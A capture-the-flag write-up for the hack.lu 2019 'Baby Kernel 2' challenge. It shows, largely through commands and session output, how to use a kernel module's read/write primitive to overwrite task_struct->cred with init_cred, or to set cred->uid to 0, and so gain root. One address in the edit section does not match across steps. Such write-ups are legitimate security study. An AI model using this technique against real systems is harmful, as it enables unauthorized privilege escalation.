# hack.lu CTF 2019

### Baby Kernel 2 - pwn , 202 pts, solves: 68



We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.

Having `read/write` primitive in kernel space we can escalate our privileges by changing `cred` field of the `task_struct` of our current task. Luckily we are provided with the `System.map` file containing all symbols from the target kernel.

Obtaining `current_task`  address:

```bash
➤ grep 'D current_task' System.map                                                     
ffffffff8183a040 D current_task
```

Let's test if we can read from this address:

```bash
➤ nc babykernel2.forfuture.fluxfingers.net 1337
(...)
flux_baby_2 opened
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 1
1
I need an address to read from. Choose wisely
> 
0xffffffff8183a040
0xffffffff8183a040
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
We're back. Our scouter says the power level is: ffff888003372300
```

We have obtained `task_struct` address from the `current_task`. To escalate privileges to root we have to modify `task_struct->cred` field at offset `0x400` (offset obtained from the disassembly of the `commit_cred` function from the provided kernel image).  

We will use `init_cred` struct, which contains credentials of the `init` process that is running as `root`.

https://github.com/torvalds/linux/blob/39a38bcba4ab6e5285b07675b0e42c96eec35e67/kernel/cred.c#L41

```
/*
 * The initial credentials for the initial task
 */
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
	.subscribers		= ATOMIC_INIT(2),
	.magic			= CRED_MAGIC,
#endif
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
	.suid			= GLOBAL_ROOT_UID,
	.sgid			= GLOBAL_ROOT_GID,
	.euid			= GLOBAL_ROOT_UID,
	.egid			= GLOBAL_ROOT_GID,
	.fsuid			= GLOBAL_ROOT_UID,
	.fsgid			= GLOBAL_ROOT_GID,
```
Since we have `System.map`:
```bash
➤ grep init_cred System.map                                                                    
ffffffff8183f4c0 D init_cred
```

To decompress the kernel image I've used this tool: `https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux`

Obtaining the offset to the `cred` field: (we could also use pwn tools, but why not like this)

```bash
➤ gdb -q ./vmlinux                                                                    
pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./vmlinux...done.
pwndbg> disassemble commit_creds 
Dump of assembler code for function commit_creds:
   0xffffffff81050c50 <+0>:	push   rbp
   0xffffffff81050c51 <+1>:	mov    rbp,rsp
   0xffffffff81050c54 <+4>:	push   r13
   0xffffffff81050c56 <+6>:	mov    r13,QWORD PTR ds:0xffffffff8183a040
   0xffffffff81050c5e <+14>:	push   r12
   0xffffffff81050c60 <+16>:	push   rbx
   0xffffffff81050c61 <+17>:	mov    r12,QWORD PTR [r13+0x3f8]
   0xffffffff81050c68 <+24>:	cmp    QWORD PTR [r13+0x400],r12
   0xffffffff81050c6f <+31>:	jne    0xffffffff81050d66 <commit_creds+278>
```
https://github.com/torvalds/linux/blob/master/include/linux/sched.h#L624

```
struct task_struct {

	(...)
	
	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
```

The `task_struct->real_cred` at offset `0x3f8` holds our current `uid (1000)`. We have to modify `task_struct->cred` at offset `0x400`.

What is left to do is to spawn a shell with the new credentials - or like in our case, just use `Read file` function that is now running as `root`:

```bash
➤ nc babykernel2.forfuture.fluxfingers.net 1337
flux_baby_2 opened
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 1
1
I need an address to read from. Choose wisely
> 
0xffffffff8183a040 <- current_task
0xffffffff8183a040
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
We're back. Our scouter says the power level is: ffff888003373480 <- task_struct
----- Menu -----
1. Readrandom: fast init done

2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 2
2
I need an offset to write to. Choose wisely - seriously now...
> 
0xffff888003373880     <-- task_struct->cred: 0xffff888003373480 + 0x400
0xffff888003373880
What about a value?
> 
0xffffffff8183f4c0     <-- init_cred
0xffffffff8183f4c0
Thanks, boss. I can't believe we're doing this!
flux_baby_2 ioctl nr 902 called
Amazingly, we're back again.
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 3
3
uid=0(root) gid=0(root)
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 4 
4 
Which file are we trying to read?
> /flag
/flag
Here are your 0x35 bytes contents: 
flag{nicely_done_this_is_how_a_privesc_can_also_go}}
```

Edit:

Instead of pointing the `task_struct->cred` to the `init_cred`, we could manually modify certain fields of the `struct cred`. We know that we can obtain `struct cred ` address from the `task_struct->cred`.

Getting `task_struct` address from `current_task`:

```bash
I need an address to read from. Choose wisely
> 
0xffffffff8183a040 <- current_task
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
We're back. Our scouter says the power level is: ffff888003371180 <- task_struct
```

Our `task_struct` address is `0xffff888003371180`. Now we can obtain the address of the `struct cred` that is referenced in the `task_struct` at offset `0x400`.  Let's read `0xffff888003371180+0x400`

```bash
I need an address to read from. Choose wisely
> 
0xffff888003371580 <- task_struct + 0x400
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
We're back. Our scouter says the power level is: ffff888003393400 <- stuct cred
```

We know that `struct cred` is at `0xffff888003393400`. 

https://github.com/torvalds/linux/blob/master/include/linux/cred.h#L111

```
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
```

Now we can set, for example `cred->uid` field at offset `4`, to `0` (root):

```
I need an offset to write to. Choose wisely - seriously now...
> 
0xffff888003389704 <- struct cred + 4
What about a value?
> 
0
Thanks, boss. I can't believe we're doing this!
flux_baby_2 ioctl nr 902 called
Amazingly, we're back again.
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 3
uid=0(root) gid=0(root) euid=1000(user) egid=1000(user) groups=1000(user)

```

That's it! Thanks



